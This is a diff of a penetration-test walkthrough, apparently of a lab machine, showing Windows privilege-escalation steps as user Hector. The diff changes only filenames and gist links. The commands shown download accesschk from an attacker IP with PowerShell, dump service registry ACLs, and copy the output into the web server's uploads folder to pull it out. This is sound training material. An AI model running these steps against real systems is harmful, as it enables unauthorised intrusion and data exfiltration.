@@ -600,9 +600,9 @@ $ cp /usr/share/windows/sysinternals-suite/accesschk64.exe .
 ```
 
 ```
-PS C:\Users\Hector\Videos> powershell -nop -c "wget http://10.10.15.123:8080/accesschk64.exe -OutFile noraj.exe"
+PS C:\Users\Hector\Videos> powershell -nop -c "wget http://10.10.15.123:8080/accesschk64.exe -OutFile cyfun.exe"
 
-.\noraj.exe -uwcqv Hector * /accepteula
+.\cyfun.exe -uwcqv Hector * /accepteula
 ```
 
 But access denied because it tries to open Service Control Manager.
@@ -610,16 +610,16 @@ But access denied because it tries to open Service Control Manager.
 Get all services:
 
 ```
-PS C:\Users\Hector\Videos> reg query hklm\system\currentcontrolset\services > noraj.txt
-PS C:\Users\Hector\Videos> copy noraj.txt C:\inetpub\wwwroot\uploads\noraj.txt
+PS C:\Users\Hector\Videos> reg query hklm\system\currentcontrolset\services > cyfun.txt
+PS C:\Users\Hector\Videos> copy cyfun.txt C:\inetpub\wwwroot\uploads\cyfun.txt
 $ cat services_fullpath.txt| cut -d '\' -f 5 > services.txt
 ```
 
 Get services owners and who can modify them.
 
 ```
-PS C:\Users\Hector\Videos> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List PSChildName,Owner,Group,AccessToString | Out-String -Width 300 > noraj.txt
-PS C:\Users\Hector\Videos> copy noraj.txt C:\inetpub\wwwroot\uploads\noraj.txt
+PS C:\Users\Hector\Videos> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List PSChildName,Owner,Group,AccessToString | Out-String -Width 300 > cyfun.txt
+PS C:\Users\Hector\Videos> copy cyfun.txt C:\inetpub\wwwroot\uploads\cyfun.txt
 ```
 
 Get services registry binary path
@@ -680,14 +680,14 @@ Why `wuauserv`? I just tried them all and it worked with this one.
 As the output of the commands listing services were very long I pasted them
 in a Gist.
 
-[Gist](https://gist.github.com/noraj/10e5d0a8c298c21cce04016f62bea2fc):
+[Gist](https://gist.github.com/S4CH/6b3f8d923b661c050e696f2d6e871b94)
 
-- [services_bin_path.txt](https://gist.github.com/noraj/10e5d0a8c298c21cce04016f62bea2fc#file-services_bin_path-txt)
-- [services_fullpath.txt](https://gist.github.com/noraj/10e5d0a8c298c21cce04016f62bea2fc#file-services_fullpath-txt)
-- [services_name.txt](https://gist.github.com/noraj/10e5d0a8c298c21cce04016f62bea2fc#file-services_name-txt)
-- [services_name2.txt](https://gist.github.com/noraj/10e5d0a8c298c21cce04016f62bea2fc#file-services_name2-txt)
-- [services_rights.txt](https://gist.github.com/noraj/10e5d0a8c298c21cce04016f62bea2fc#file-services_rights-txt)
-- [services_that_can_be_restarted.txt](https://gist.github.com/noraj/10e5d0a8c298c21cce04016f62bea2fc#file-services_that_can_be_restarted-txt)
+- [services_bin_path.txt](https://gist.github.com/S4CH/6b3f8d923b661c050e696f2d6e871b94#file-services_bin_path_for_htb-txt)
+- [services_fullpath.txt](https://gist.github.com/S4CH/56934c1c8943c988f8758d9ac03591d9#file-services_full_path_for_htb-txt)
+- [services_name.txt](https://gist.github.com/S4CH/3653068fa256096b7ce2b5c223385ceb#file-names_of_services-txt)
+- [services_name2.txt](https://gist.github.com/S4CH/349fd9b09271f01c3bbd2b532695b289#file-names_of_services-_2-txt)
+- [services_rights.txt](https://gist.github.com/S4CH/13da1ea8075115d4859e9130c02e461b#file-services_rights_for_htb-txt)
+- [services_that_can_be_restarted.txt](https://gist.github.com/S4CH/7f4983f57de320b529a58abc640e71e7#file-restarted_services-txt)
 
 
 
